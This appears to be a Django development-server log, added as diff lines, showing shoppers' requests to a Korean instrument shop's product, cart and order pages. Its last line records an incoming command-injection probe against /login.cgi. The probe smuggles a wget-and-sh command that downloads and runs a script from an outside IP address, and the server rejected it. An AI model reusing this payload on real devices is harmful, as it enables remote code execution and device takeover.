+[15/Aug/2018 17:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%A0%95%EC%95%85_%EC%95%84%EC%9F%81.png HTTP/1.1" 200 475136
+[15/Aug/2018 17:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 606208
+[15/Aug/2018 17:52:03] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 606208
+[15/Aug/2018 17:52:07] "POST /products/5/ HTTP/1.1" 302 0
+[15/Aug/2018 17:52:07] "GET /mypage/cart/ HTTP/1.1" 200 3110
+[15/Aug/2018 17:52:13] "GET /order/5/ HTTP/1.1" 200 3022
+[15/Aug/2018 17:52:17] "GET /mypage/ HTTP/1.1" 200 4029
+[15/Aug/2018 17:52:19] "GET /mypage/order/ HTTP/1.1" 200 2863
+Invalid HTTP_HOST header: 'questminsok.cafe24.com'. You may need to add 'questminsok.cafe24.com' to ALLOWED_HOSTS.
+Bad Request: /login.cgi
+[15/Aug/2018 17:54:00] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.163.45.82/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27$ HTTP/1.1" 400 60232
